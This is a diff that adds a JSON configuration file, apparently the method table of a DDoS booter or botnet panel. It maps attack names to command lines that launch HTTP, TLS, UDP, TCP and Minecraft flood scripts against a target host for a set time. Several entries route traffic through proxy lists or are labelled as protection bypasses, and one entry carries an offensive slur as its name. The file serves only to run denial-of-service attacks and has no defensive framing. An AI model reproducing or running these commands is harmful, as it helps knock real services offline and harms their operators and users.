@@ -1,0 +1,15 @@
+{
+    "http": "node mix.js {host} {time} 1 1",
+    "tls": "node tls.js {host} {time} 1 1",
+    "xran-bypass": "node xran-bypass.js {host} {time} 8 5 proxy.txt", 
+    "hyper": "node hyper.js {host} {time}",
+    "storm-rush": "node STORM-RUSH.js GET {host} {time} 8 128 px.txt --query 1 --bfm --httpver http/1.1 --referer %RAND% --ua \"Browser18/2.0 (Device76; iOS)\" --ratelimit",
+    "rape": "node rape.js GET {time} 1 proxy.txt 1 {host}",
+    "thunder": "node thunder.js {host} {time} 1 1 proxy.txt",
+    "bypass": "node bypass.js {host} {time} 1 1 proxy.txt",
+    "browser": "node tornado GET {host} {time} 1 1 proxy.txt",
+    "udp": "./udp {host} {port} {time}",
+    "udphex": "./udphex {host} {port} 1 {time}",
+    "mcbot": "node StarsXMc.js {host} {port} {time}",
+    "tcp": "node StarsXSamp.js {host} {port} {time}"
+}
